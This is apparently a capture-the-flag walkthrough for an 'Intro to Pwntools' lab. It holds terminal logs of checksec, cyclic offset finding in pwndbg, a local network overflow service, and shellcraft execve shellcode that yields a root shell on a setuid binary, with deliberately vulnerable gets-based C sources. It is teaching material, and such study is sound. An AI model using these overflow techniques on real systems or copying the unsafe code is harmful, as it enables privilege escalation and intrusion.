# Intro to Pwntools

<img src="pwntools.png" alt="pwntools" width=200/>

```
buzz@intro2pwn:~/IntroToPwntools$ cat note.txt


Dear buzz,
Welcome to Intro to Pwntools!
In this folder, you will find
a wonderful adventure of 
binary exploitation!

Sincerely,
dizmas
```
## Checksec

```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/checksec$ checksec intro2pwn1
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/checksec/intro2pwn1'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/checksec$ checksec intro2pwn2
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/checksec/intro2pwn2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/checksec$ ./intro2pwn1
Please input your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
*** stack smashing detected ***: <unknown> terminated
Aborted (core dumped)
```
## Cyclic

```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ ls -al
total 32
drwxrwxr-x 2 buzz   buzz   4096 Jun 10 02:23 .
drwxrwxr-x 6 buzz   buzz   4096 May 19  2021 ..
-rw------- 1 buzz   buzz    101 Jun  9 17:53 .gdb_history
-rw-rw-r-- 1 buzz   buzz    105 May 19  2021 alphabet
-r--r----- 1 dizmas dizmas   22 May 19  2021 flag.txt
-rwsrwxr-x 1 dizmas dizmas 7444 May 19  2021 intro2pwn3
-rw-rw-r-- 1 buzz   buzz    359 Jun 10 02:23 test_cyclic.c
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ cat test_cyclic.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void print_flag() {
        printf("Getting Flag:\n");
        fflush(stdout);
        char *cat_flag[3] = {"/bin/cat", "flag.txt", NULL};
        execve("/bin/cat", cat_flag,  NULL);
        exit(0);
}

void start(){
        char name[24];
        gets(name);
}


int main(){
        printf("I run as dizmas.\n");
        printf("Who are you?: ");
        start();

}
```

```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ checksec intro2pwn3
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/cyclic/intro2pwn3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```


```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ gdb intro2pwn3     
GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 195 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from intro2pwn3...(no debugging symbols found)...done.
pwndbg> r < alphabet
Starting program: /home/buzz/IntroToPwntools/IntroToPwntools/cyclic/intro2pwn3 < alphabet
I run as dizmas.

Program received signal SIGSEGV, Segmentation fault.
0x4a4a4a4a in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0xff9bf208 ◂— 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
 EBX  0x48484848 ('HHHH')
 ECX  0xf7f7f5c0 (_IO_2_1_stdin_) ◂— 0xfbad2088
 EDX  0xf7f8089c (_IO_stdfile_0_lock) ◂— 0x0
 EDI  0x0
 ESI  0xf7f7f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
 EBP  0x49494949 ('IIII')
 ESP  0xff9bf230 ◂— 'KKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
 EIP  0x4a4a4a4a ('JJJJ')
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Invalid address 0x4a4a4a4a










─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xff9bf230 ◂— 'KKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
01:0004│     0xff9bf234 ◂— 'LLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
02:0008│     0xff9bf238 ◂— 'MMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
03:000c│     0xff9bf23c ◂— 'NNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
04:0010│     0xff9bf240 ◂— 'OOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
05:0014│     0xff9bf244 ◂— 'PPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
06:0018│     0xff9bf248 ◂— 'QQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
07:001c│     0xff9bf24c ◂— 'RRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 0x4a4a4a4a
   f 1 0x4b4b4b4b
   f 2 0x4c4c4c4c
   f 3 0x4d4d4d4d
   f 4 0x4e4e4e4e
   f 5 0x4f4f4f4f
   f 6 0x50505050
   f 7 0x51515151
```

```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ cyclic 100 > pattern
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ gdb intro2pwn3      
GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 195 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from intro2pwn3...(no debugging symbols found)...done.
pwndbg> r < pattern
Starting program: /home/buzz/IntroToPwntools/IntroToPwntools/cyclic/intro2pwn3 < pattern
I run as dizmas.

Program received signal SIGSEGV, Segmentation fault.
0x6161616a in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0xfff91d58 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 EBX  0x61616168 ('haaa')
 ECX  0xf7f755c0 (_IO_2_1_stdin_) ◂— 0xfbad2098
 EDX  0xf7f7689c (_IO_stdfile_0_lock) ◂— 0x0
 EDI  0x0
 ESI  0xf7f75000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
 EBP  0x61616169 ('iaaa')
 ESP  0xfff91d80 ◂— 'kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 EIP  0x6161616a ('jaaa')
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Invalid address 0x6161616a










─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xfff91d80 ◂— 'kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
01:0004│     0xfff91d84 ◂— 'laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
02:0008│     0xfff91d88 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
03:000c│     0xfff91d8c ◂— 'naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
04:0010│     0xfff91d90 ◂— 'oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
05:0014│     0xfff91d94 ◂— 'paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
06:0018│     0xfff91d98 ◂— 'qaaaraaasaaataaauaaavaaawaaaxaaayaaa'
07:001c│     0xfff91d9c ◂— 'raaasaaataaauaaavaaawaaaxaaayaaa'
───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 0x6161616a
   f 1 0x6161616b
   f 2 0x6161616c
   f 3 0x6161616d
   f 4 0x6161616e
   f 5 0x6161616f
   f 6 0x61616170
   f 7 0x61616171
```

```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ ls
alphabet  flag.txt  intro2pwn3  pattern  test_cyclic.c
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ touch pwn_cyclic.py
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ nano pwn_cyclic.py 
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ python pwn_cyclic.py > attack
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ ls
alphabet  attack  flag.txt  intro2pwn3  pattern  pwn_cyclic.py  test_cyclic.c
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ gdb
GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word".
pwndbg: loaded 195 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg> r < attack
Starting program:  < attack
No executable file specified.
Use the "file" or "exec-file" command.
pwndbg> quit
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ gdb intro2pwn3
GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 195 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from intro2pwn3...(no debugging symbols found)...done.
pwndbg> r < attack
Starting program: /home/buzz/IntroToPwntools/IntroToPwntools/cyclic/intro2pwn3 < attack
I run as dizmas.

Program received signal SIGSEGV, Segmentation fault.
0xdeadbeef in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0xffc4abf8 ◂— 0x61616161 ('aaaa')
 EBX  0x61616168 ('haaa')
 ECX  0xf7f9c5c0 (_IO_2_1_stdin_) ◂— 0xfbad2088
 EDX  0xf7f9d89c (_IO_stdfile_0_lock) ◂— 0x0
 EDI  0x0
 ESI  0xf7f9c000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
 EBP  0x61616169 ('iaaa')
 ESP  0xffc4ac20 —▸ 0xffc4ac00 ◂— 0x61616163 ('caaa')
 EIP  0xdeadbeef
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Invalid address 0xdeadbeef










─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffc4ac20 —▸ 0xffc4ac00 ◂— 0x61616163 ('caaa')
01:0004│     0xffc4ac24 ◂— 0x0
02:0008│     0xffc4ac28 ◂— 0x0
03:000c│     0xffc4ac2c —▸ 0xf7ddcf21 (__libc_start_main+241) ◂— add    esp, 0x10
04:0010│     0xffc4ac30 —▸ 0xf7f9c000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
05:0014│     0xffc4ac34 —▸ 0xf7f9c000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
06:0018│     0xffc4ac38 ◂— 0x0
07:001c│     0xffc4ac3c —▸ 0xf7ddcf21 (__libc_start_main+241) ◂— add    esp, 0x10
───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 0xdeadbeef
```

```
pwndbg> print& print_flag
$1 = (<text variable, no debug info> *) 0x8048536 <print_flag>
```

```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ python pwn_cyclic.py > attack
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ ls
alphabet  attack  flag.txt  intro2pwn3  pattern  pwn_cyclic.py  test_cyclic.c
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ ./intro2pwn3 < attack
I run as dizmas.
Who are you?: Getting Flag:
flag{cyclic_flag}
```

## Networking

```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ cat note_to_buzz.txt
Dear buzz,

I'm running a service on port 1337, which has an overflow vulnerability.
I've left you a version that will run on port 1336 so that you can develop
your exploit. 

Sincerely,
dizmas
```

```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ checksec serve_test
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/networking/serve_test'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ cat test_networking.c
//Networking C code from:
// https://www.geeksforgeeks.org/tcp-server-client-implementation-in-c/

#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#define MAX 32
#define PORT 1336
#define SA struct sockaddr
  
// function which handles input and output over the socket
void target_function(int sockfd)
{
    struct {
        char buff[MAX];
        volatile int printflag;
    } targets;


    for (;;) {
        bzero(targets.buff, MAX);
  
        write(sockfd, "Give me deadbeef: ", 18);

        targets.printflag = 0;
        read(sockfd, targets.buff, 100);
        
        printf("From client: %s\t ", targets.buff);
        bzero(targets.buff, MAX);
  
  
        if (targets.printflag == 0xdeadbeef) {
            write(sockfd, "Thank you!\nflag{*****************}", 34);
            break;
        }
        else if (targets.printflag != 0) {
            write(sockfd, "Buffer Overflow, but not with 0xdeadbeef", 40);
            break;
        }
    }
}
  

int main()
{
    int sockfd, connfd, len;
    struct sockaddr_in servaddr, cli;
  
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        printf("socket creation failed...\n");
        exit(0);
    }
    else
        printf("Socket successfully created..\n");
    bzero(&servaddr, sizeof(servaddr));
  
    // assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    servaddr.sin_port = htons(PORT);
  
    // Binding newly created socket to given IP and verification
    if ((bind(sockfd, (SA*)&servaddr, sizeof(servaddr))) != 0) {
        printf("socket bind failed...\n");
        exit(0);
    }
    else
        printf("Socket successfully binded..\n");
  
    // Now server is ready to listen and verification
    if ((listen(sockfd, 5)) != 0) {
        printf("Listen failed...\n");
        exit(0);
    }
    else
        printf("Server listening..\n");
    len = sizeof(cli);
  
    // Accept the data packet from client and verification
    connfd = accept(sockfd, (SA*)&cli, &len);
    if (connfd < 0) {
        printf("server acccept failed...\n");
        exit(0);
    }
    else
        printf("server acccept the client...\n");
  
    // target function handles input and output
    target_function(connfd);
  
    // After chatting close the socket
    close(sockfd);
}
```

```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ ./serve_test
Socket successfully created..
Socket successfully binded..
Server listening..
server acccept the client...
From client: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ� 
```

```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ touch exploit.py
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ nano exploit.py
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ python exploit.py
[+] Opening connection to 127.0.0.1 on port 1336: Done
Give me deadbeef: 
Thank you!
flag{*****************}
[*] Closed connection to 127.0.0.1 port 1336
```

```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ touch expoit.py
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ nano expoit.py
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ python expoit.py
[+] Opening connection to 127.0.0.1 on port 1337: Done
Give me deadbeef: 
Thank you!
flag{networking_flag}
[*] Closed connection to 127.0.0.1 port 1337
```

## Shellcraft

```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ cat note_to_buzz_2.txt
Dear buzz,

For this last pwntools challenge, you will need to disable ASLR.
I have provided a script for you to do so, which you can run as 
sudo without a password. Just run:

sudo ./disable_aslr.sh


Good luck!

Sincerely,
dizmas
```

```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ sudo ./disable_aslr.sh
0
```

```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ ls -al
total 32
drwxrwxr-x 2 buzz   buzz   4096 Jun 10 02:18 .
drwxrwxr-x 6 buzz   buzz   4096 May 19  2021 ..
-rw------- 1 buzz   buzz     71 Jun  9 22:07 .gdb_history
-rwxrwxr-x 1 dizmas dizmas   49 May 19  2021 disable_aslr.sh
-rwsrwxr-x 1 root   root   7236 May 19  2021 intro2pwnFinal
-rw-rw-r-- 1 dizmas dizmas  233 May 19  2021 note_to_buzz_2.txt
-rw-rw-r-- 1 buzz   buzz    191 Jun  9 21:37 test_shellcraft.c
```

```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ cat test_shellcraft.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


void start(){
        char input[64];
        gets(input);
}


int main(){
        printf("Hello There. Do you have an input for me?\n");
        start();

}
```

```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ checksec intro2pwnFinal
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/shellcraft/intro2pwnFinal'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ cyclic 100 > pattern
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ gdb intro2pwnFinal  
GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 195 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from intro2pwnFinal...(no debugging symbols found)...done.
pwndbg> r < pattern
Starting program: /home/buzz/IntroToPwntools/IntroToPwntools/shellcraft/intro2pwnFinal < pattern
Hello There. Do you have an input for me?

Program received signal SIGSEGV, Segmentation fault.
0x61616174 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0xffffd3f0 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 EBX  0x61616172 ('raaa')
 ECX  0xf7fc15c0 (_IO_2_1_stdin_) ◂— cwde    /* 0xfbad2098 */
 EDX  0xf7fc289c (_IO_stdfile_0_lock) ◂— 0
 EDI  0x0
 ESI  0xf7fc1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
 EBP  0x61616173 ('saaa')
 ESP  0xffffd440 ◂— 'uaaavaaawaaaxaaayaaa'
 EIP  0x61616174 ('taaa')
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Invalid address 0x61616174










─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffd440 ◂— 'uaaavaaawaaaxaaayaaa'
01:0004│     0xffffd444 ◂— 'vaaawaaaxaaayaaa'
02:0008│     0xffffd448 ◂— 'waaaxaaayaaa'
03:000c│     0xffffd44c ◂— 'xaaayaaa'
04:0010│     0xffffd450 ◂— 'yaaa'
05:0014│     0xffffd454 —▸ 0xf7fc1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
06:0018│     0xffffd458 ◂— 0x0
07:001c│     0xffffd45c —▸ 0xf7e01f21 (__libc_start_main+241) ◂— add    esp, 0x10
───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 0x61616174
   f 1 0x61616175
   f 2 0x61616176
   f 3 0x61616177
   f 4 0x61616178
   f 5 0x61616179
```

```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ python exploit.py
[+] Starting local process './intro2pwnFinal': pid 1310
[*] Switching to interactive mode
```


```
$ shellcraft i386.linux.sh -f a
Warning: error: setupterm: could not find terminfo database

Terminal features will not be available.  Consider setting TERM variable to your current terminal name (or xterm).
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, \x1b[31mesp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80
```

```
$ whoami
root
```

```
$ cd /root
$ ls
flag.txt
$ cat flag.txt
flag{shellcraft_flag}
```



